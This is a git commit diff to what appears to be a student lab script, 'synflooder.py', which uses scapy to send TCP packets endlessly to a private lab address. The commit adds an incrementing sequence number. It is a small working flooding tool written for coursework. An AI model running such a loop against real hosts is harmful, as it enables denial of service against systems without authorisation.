cac138167c545c2a2bbdd8499c7efde10e594301
Anjali Menon <anjmenon@MacBook-Pro.local>
2019-02-17 03:05:40 -0600

    Basic

--- Lab4/synflooder.py
+++ Lab4/synflooder.py
@@ -1,7 +1,9 @@
 from scapy.all import *
 
+seq_no = 1
 while 1:
     dst_ip = "192.168.200.62"
     dst_port = 31337
-    my_packet = IP(dst=dst_ip)/TCP(dport=dst_port)/"anjalim3"
+    my_packet = IP(dst=dst_ip)/TCP(dport=dst_port, seq = seq_no)/"anjalim3"
     send(my_packet)
+    seq_no = seq_no + 1
